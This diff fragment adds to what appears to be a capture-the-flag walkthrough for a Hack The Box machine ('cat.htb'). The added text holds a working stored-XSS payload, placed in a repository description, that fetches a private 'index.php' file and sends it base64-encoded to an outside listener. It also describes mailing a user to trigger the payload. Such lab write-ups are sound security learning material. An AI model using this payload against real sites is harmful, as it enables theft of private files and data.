@@ -372,7 +372,23 @@ Table: None
 
 ![image](https://github.com/user-attachments/assets/a8185f6d-ad24-40a6-a1f7-b7b15958b6f0)
 
-- I found this payload to read the repo's `index.php` file and send the content to a netcat server.I created the malicious repo first.
+- I found this payload to read the repo's `index.php` file and send the content to a netcat server.I created the malicious repo first with this xss payload as the description-:
+
+```html
+<a href='javascript:fetch("http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php").then(response=>response.text()).then(data=>fetch("http://10.10.14.176:8001/?d="+encodeURIComponent(btoa(unescape(encodeURIComponent(data))))));'>payload</a>
+```
+
+- Then, send a mail to `jobert@cat.htb`
+
+![image](https://github.com/user-attachments/assets/6b4ddf25-60f9-4a31-b0e0-792380f33163)
+
+- I receieved this base64 blob.
+
+
+
+
+
+
 
 
 
